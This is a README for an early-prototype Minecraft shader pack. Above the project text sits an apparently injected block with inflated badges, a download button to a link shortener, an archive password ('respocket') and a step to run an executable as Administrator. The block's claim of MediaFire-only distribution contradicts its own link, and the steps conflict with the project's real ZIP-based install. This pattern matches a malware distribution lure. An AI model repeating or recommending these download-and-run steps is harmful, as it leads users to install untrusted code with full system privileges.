<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# MinecraftShadersByAI

An experimental Minecraft Java shader pack aiming for **high visual realism with broad hardware compatibility**.

The goal is not to force every GPU to run the same expensive effects. The pack should scale: a conservative default, optional quality tiers, and graceful fallbacks for features that a device cannot handle.

## Project status

Early prototype. The terrain shaders are undergoing their first automated syntax checks; the pack has **not yet been verified in a running Minecraft + Iris instance**. Do not treat compatibility or visual quality as proven until runtime test results are recorded.

## Design goals

- **Realistic, coherent lighting:** natural daylight and sky colours, believable shadows, atmospheric fog, water, clouds, and restrained colour grading.
- **Performance first:** avoid expensive effects by default; profile each feature; offer Low, Medium, High, and Ultra-style options as they become feasible.
- **Broad compatibility:** prefer common GLSL features and conservative shader paths; include simpler fallbacks rather than requiring ray tracing or a specific GPU vendor.
- **Good defaults:** the pack should look good without users having to tune dozens of settings.
- **Transparent provenance:** only reuse code whose licence and source can be verified. Credit upstream authors, retain required notices, and record exactly what was reused or adapted.
- **Preserve project signatures:** `signature.ws` is intentionally part of the repository and must not be deleted as cleanup.

## Compatibility promise

The goal is to support as many Iris-capable systems as practical, not to promise every GPU or driver will work. Minecraft version, Iris version, operating system, graphics API, GPU features, and driver bugs all affect compatibility. The minimum path will be tested first; advanced effects will be optional.

## Requirements

- Minecraft Java Edition with a compatible Iris installation
- A graphics driver supported by the user's Minecraft/Iris setup

## Install for testing

1. Download the repository ZIP from GitHub.
2. Ensure the ZIP's root contains the `shaders/` folder directly.
3. Put the ZIP in Minecraft's `shaderpacks` folder.
4. Select it in Iris's shader-pack menu.
5. If it fails, enable Iris debug mode and share the shader compile log before changing unrelated settings.
